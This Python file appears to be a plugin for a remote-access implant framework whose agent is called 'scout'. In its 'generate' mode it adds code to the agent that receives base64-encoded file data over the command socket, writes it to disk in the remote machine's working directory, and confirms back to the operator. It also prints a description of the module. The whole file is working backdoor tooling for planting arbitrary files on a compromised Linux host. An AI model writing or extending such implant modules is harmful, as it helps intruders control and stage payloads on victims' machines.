import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('from base64 import b64decode')
        config.functions.append('''
def upload(data):
    data = data.split(' ')
    filename = ' '.join(data[1:-1])
    f = open(filename,'wb')
    f.write(b64decode(data[-1]))
    s.sendall('[+]Successfully wrote uploaded file data'.encode())''')
        config.logics.append('''
            elif command == "upload":
                upload(data)''')
        config.help_menu['upload <Local file path>'] = 'Remotely upload a file to remote current working directory of scout'
    elif option == 'info':
        print('\nName             : Upload File component' \
              '\nOS               : Linux' \
              '\nRequired Modules : base64' \
              '\nCommands         : upload <Local file path>' \
              '\nDescription      : Remotely upload a file to remote current working directory of scout, utilizes base64 to encode binary data\n')
